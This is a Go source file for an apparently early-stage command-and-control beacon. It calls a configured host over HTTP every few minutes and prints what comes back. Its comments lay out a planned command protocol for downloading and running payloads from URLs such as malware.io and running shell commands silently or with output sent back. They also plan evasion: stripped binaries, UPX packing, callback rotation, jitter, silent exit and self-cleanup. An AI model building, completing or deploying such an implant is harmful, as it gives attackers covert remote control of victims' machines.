package main

import (
	"fmt" // TODO: Implement a pre-processor / build script which will strip out this import and all print lines (and anything that refers to DebugMode)
	"flag"
	"io/ioutil"
	"net/http"
	"os"
	"strconv"
	"time"
)

// TODO: Get rid of this
const DebugMode = true

// TODO: Add support for callback rotation (using different domain names, IP's, and/or ports)

// TODO: Use ldflags instead of command line flags when compiling the binary: go build -o merlinagent.exe -ldflags "-X main.url=https://acme.com:443/" cmd/merlinagent/main.go

/**
* To build, run the following command:
*
* go build -ldflags "-w -s" simple_http_beacon.go
*
* The -w flag is used to exclude debugging information, which helps to shrink the final binary size
*
* Can also use the upx utility on Linux to pack and then unpack the binary (to make it smaller on the wire)

TODO: Figure out the cross-compilation stuff; the -s flag also helps shrink the binary size.
*/

/*


Beacon Action Request Format:

[ACTION] [DETAILS]

Examples:

GET http://malware.io/new_payload.malware
EXECUTE [SHELL COMMAND]

""

Supported Actions:

* GET [URL] [file:<LOCAL DOWNLOAD LOCATION>]: Have the beacon stage a new payload (but do not run)
* RUN [url:URL | file:<LOCAL FILE LOCATION>]: Have the beacon run the specified payload (will first download the payload if a URL is provided)
* EXECUTE [SYSTEM COMMAND TO EXECUTE]: Will execute the specified system / shell command(s) and send the output back
* EXECUTE_SILENT [SYSTEM COMMAND TO EXECUTE]: Will execute the specified system / shell command(s), but will *not* send the output back
* CONFIGURE [CONFIGURATION NAME] [CONFIGURATION VALUE]: Change configuration value
*/
func parse_response_body(body string) {

}

var dstPort = 9090
var dstHost = "" // Can be an IP or hostname, but must be provided
var clientToken = "" // Unique string to identify this beacon. Must be provided.
var callbackInterval = 300 // TODO: Add support for enabling randomized jitter on callback time

func init() {
	// flag.IntVar(&dstPort, "dstPort", 9090, "Set the port to call back to; defaults to port 9090")
	// flag.StringVar(&dstHost, "dstHost", "", "The host to callback to. Can be either an IP address or a hostname. Required value.")
	// flag.StringVar(&clientToken, "clientToken", "", "Unique string to identify this beacon. Required value.")
	// flag.IntVar(&callbackInterval, "callbackInterval", 300, "How often to callback to the server (in seconds); default is to callback once every 300 seconds (5 minutes).")

	// If required ldflags (load flags) are not provided, simply exit silently
	if dstHost == "" || clientToken == "" {
		//fmt.Println("\nUSAGE: simple_http_beacon -dst='<listener host>' -port=<dst port> -token='<unique ID token>' -sleep=<time between callbacks in seconds>\n")
		os.Exit(0)
	}
}

// TODO: Add in event handling loop for handling calls from C2 -> the beacon
func main() {
	// TODO: Catch any errors and fail silently / do self-cleanup

	// TODO: Remove all debug statements
	if DebugMode {
		fmt.Println("Starting beacon with sleep interval of ", strconv.Itoa(callbackInterval), "...")
	}

	dst_url := "http://" + dstHost + ":" + strconv.Itoa(dstPort) + "/" + clientToken

	if DebugMode {
		fmt.Println("DST URL:", dst_url)
	}

	// Go's version of a while-true loop
	for {
		if DebugMode {
			fmt.Println("Sending GET request to", dst_url)
		}
		resp, err := http.Get(dst_url)

		if err == nil {
			body, err := ioutil.ReadAll(resp.Body)

			if err == nil {
				// TODO: Handle response properly
				fmt.Println("Got response: " + string(body))
			} else if DebugMode {
				fmt.Println("ERROR:", err)
			}

			resp.Body.Close()
		} else if DebugMode {
			fmt.Println("ERROR:", err)
		}

		time.Sleep(time.Duration(callbackInterval) * time.Second)
	}
}
